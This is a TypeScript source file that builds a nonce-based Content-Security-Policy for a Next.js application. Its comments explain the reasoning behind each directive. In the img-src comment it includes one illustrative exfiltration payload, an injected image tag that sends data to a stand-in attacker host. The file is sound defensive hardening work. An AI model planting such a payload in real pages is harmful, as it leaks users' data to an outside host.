/**
 * Content-Security-Policy.
 *
 * Built per request, in `src/proxy.ts`, because it carries a nonce.
 *
 * ---------------------------------------------------------------------------
 * Why a nonce, and what a static header was doing wrong
 * ---------------------------------------------------------------------------
 *
 * The previous policy shipped `script-src 'self'` as a static header and called
 * it the strict production setting. It was strict, and it was **breaking the
 * application**: Next emits a small number of inline bootstrap scripts that
 * carry the server-rendered data React needs to hydrate. `'self'` blocks them,
 * so in production every page rendered as static HTML with no interactivity and
 * React reported hydration error #412.
 *
 * It was invisible because the end-to-end suite ran against `next dev`, where
 * script-src also allows `'unsafe-inline'`. Serving an actual production build
 * and reading the console is what surfaced it.
 *
 * A nonce fixes it without loosening anything: the inline scripts Next controls
 * carry the nonce, and an injected one cannot, because the attacker cannot know
 * a value generated after their payload was stored.
 *
 * `'strict-dynamic'` lets a nonced script load the chunks it needs, so the
 * policy does not have to enumerate Next's chunk URLs. In a `'strict-dynamic'`
 * policy, host-source expressions such as `'self'` are ignored by browsers that
 * support it — they are kept for older ones, which is exactly what the spec
 * intends.
 *
 * ---------------------------------------------------------------------------
 * style-src
 * ---------------------------------------------------------------------------
 *
 * Split, and measured rather than assumed — including the part that did not
 * work out.
 *
 * The *served* HTML contains no inline `<style>`: Next emits CSS as external
 * files. But `sonner`, the toast library, injects a `<style>` element from
 * JavaScript after hydration, and a runtime-injected element cannot carry a
 * nonce the server generated. Loading the page with `style-src-elem 'self'` and
 * reading the console is what showed this; the first attempt at this policy
 * assumed the served HTML was the whole story and was wrong.
 *
 * So `'unsafe-inline'` stays on `style-src-elem`, for one named reason rather
 * than as a blanket allowance. Removing it needs sonner replaced or its
 * stylesheet extracted to a file — a real change, not a header edit, and not
 * worth breaking every toast in the product for.
 *
 * `style-src-attr 'unsafe-inline'` remains for a different and permanent
 * reason: React and Recharts set `style` attributes on elements, and no browser
 * supports a nonce for an attribute.
 *
 * What this policy does still buy: an injected `<style>` cannot be *the* vector
 * on its own, because `script-src` has no `'unsafe-inline'` at all — the
 * expensive half is closed.
 *
 * ---------------------------------------------------------------------------
 * img-src
 * ---------------------------------------------------------------------------
 *
 * Narrowed from `https:`, which permitted every host on the internet, to the two
 * hosts `images.remotePatterns` allows. A broad img-src is a ready-made
 * exfiltration channel: a URL is a GET request, and an injected
 * `<img src="https://attacker.test/?d=…">` needs no script at all.
 */

const isProduction = process.env.NODE_ENV === "production";

export function contentSecurityPolicy(nonce: string): string {
  return [
    "default-src 'self'",

    // The nonce is what makes Next's own inline bootstrap run while an injected
    // inline script does not. 'unsafe-eval' stays off in production; development
    // needs it for React refresh.
    `script-src 'nonce-${nonce}' 'strict-dynamic' 'self'${isProduction ? "" : " 'unsafe-eval' 'unsafe-inline'"}`,

    // Fallback for browsers without the split directives below.
    "style-src 'self' 'unsafe-inline'",
    // 'unsafe-inline' for one measured reason: sonner injects its stylesheet
    // from JavaScript at runtime, and a runtime-injected element cannot carry a
    // server-generated nonce.
    "style-src-elem 'self' 'unsafe-inline'",
    // React and Recharts set style attributes; no browser supports a nonce here.
    "style-src-attr 'unsafe-inline'",

    "img-src 'self' data: blob: https://avatars.githubusercontent.com https://lh3.googleusercontent.com",
    "font-src 'self' data:",
    "connect-src 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "frame-src 'none'",
    "object-src 'none'",
    "media-src 'none'",
    // 'none' rather than 'self': the app has no <base> element, and an injected
    // one silently rewrites every relative URL on the page.
    "base-uri 'none'",
    "worker-src 'self' blob:",
    "manifest-src 'self'",
    ...(isProduction ? ["upgrade-insecure-requests"] : []),
  ].join("; ");
}

/**
 * The policy for responses that do not pass through the proxy — API routes and
 * static assets, which never contain a script and so need no nonce.
 */
export const STATIC_CSP = [
  "default-src 'none'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
  "form-action 'none'",
].join("; ");
